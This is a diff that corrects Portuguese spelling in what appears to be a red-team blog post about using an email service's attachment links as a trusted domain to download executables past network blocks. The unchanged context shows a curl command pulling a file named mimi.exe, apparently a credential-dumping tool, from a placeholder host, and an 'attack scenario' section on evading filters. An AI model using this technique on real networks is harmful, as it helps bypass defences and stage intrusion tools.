@@ -26,7 +26,7 @@ Depois de enviarmos vamos em **Itens Enviados** e baixar o arquivo em anexo para
 
 ![bh-Look](../assets/img/2021-12-06/IMG08.png)
 
-Com o "link direto" podemos realizar o download através do PowerShell do Windows utilizando o comando **Curl** e a opção **-o** de output para criar a saida do arquivo com a extensão original (*um executável*) então o comando seria: `curl "link_do_arquivo.com.br" -o mimi.exe`
+Com o "link direto" podemos realizar o download através do PowerShell do Windows utilizando o comando **Curl** e a opção **-o** de output para criar a saída do arquivo com a extensão original (*um executável*) então o comando seria: `curl "link_do_arquivo.com.br" -o mimi.exe`
 
 ![bh-Look](../assets/img/2021-12-06/IMG09.png)
 
@@ -40,5 +40,5 @@ Com o "link direto" podemos realizar o download através do PowerShell do Window
 * Arquivos muito grandes também são bloqueados por conta da restrição de tamanho por parte do anexo.
 * Um outro ponto interessante é que o arquivo após enviado tem um prazo de validade que vária entre 10 à 15 minutos
 
-## Cénario de Ataque
+## Cenário de Ataque
 Esse tipo de técnica é útil em ambientes internos (externos também) onde geralmente existem bloqueios em determinadas origens, e por se tratar de um “domínio confiável” podemos realizar o download de forma segura.
